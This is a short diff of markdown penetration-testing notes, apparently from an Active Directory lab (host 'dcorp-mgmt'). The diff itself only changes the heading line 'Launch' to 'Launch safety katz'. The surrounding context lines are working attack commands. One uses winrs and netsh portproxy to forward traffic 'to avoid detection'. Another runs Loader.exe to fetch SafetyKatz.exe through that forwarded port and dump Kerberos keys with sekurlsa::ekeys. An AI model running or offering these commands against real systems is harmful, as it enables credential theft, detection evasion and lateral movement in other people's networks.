@@ -204,7 +204,7 @@ To avoid detection while download safetykatz add a portforwarding on the remote 
 ```powershell
 $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.99.115"
 ```
-Launch 
+Launch safety katz
 ```Powershell
 $null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
 ```
